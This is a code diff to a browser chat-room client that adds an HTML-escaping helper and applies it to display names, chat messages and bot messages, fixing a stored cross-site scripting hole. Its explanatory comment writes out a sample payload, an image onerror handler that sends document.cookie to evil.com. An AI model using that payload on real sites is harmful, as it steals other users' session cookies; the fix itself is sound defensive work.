@@ -1,4 +1,19 @@
 // =======================
+// SECURITY: escape user-controlled strings before inserting into the DOM.
+// FIXED: display names and chat messages come straight from other users
+// (via RTM attributes / channel messages) and were inserted with
+// insertAdjacentHTML with no escaping. A user could set their display
+// name to e.g. <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
+// and it would execute in every other participant's browser (stored XSS
+// across the whole room). All dynamic values are now escaped.
+// =======================
+let escapeHtml = (str) => {
+  const div = document.createElement("div");
+  div.textContent = String(str ?? "");
+  return div.innerHTML;
+};
+
+// =======================
 // MEMBER JOIN / LEAVE
 // =======================
 
@@ -36,7 +51,7 @@ let addMemberToDom = async (memberId) => {
   let memberItem = `
     <div class="member__wrapper" id="member__${memberId}__wrapper">
       <span class="green__icon"></span>
-      <p class="member_name">${name}</p>
+      <p class="member_name">${escapeHtml(name)}</p>
     </div>
   `;
 
@@ -139,8 +154,8 @@ let addMessageToDom = async (name, message) => {
   let newMessage = `
     <div class="message__wrapper">
       <div class="message__body">
-        <strong class="message__author">${name}</strong>
-        <p class="message__text">${message}</p>
+        <strong class="message__author">${escapeHtml(name)}</strong>
+        <p class="message__text">${escapeHtml(message)}</p>
       </div>
     </div>
   `;
@@ -157,7 +172,7 @@ let addBotMessageToDom = async (botMessage) => {
   let newMessage = `
     <div class="message__wrapper">
       <div class="message__body__bot">
-        <p class="message__text__bot">${botMessage}</p>
+        <p class="message__text__bot">${escapeHtml(botMessage)}</p>
       </div>
     </div>
   `;
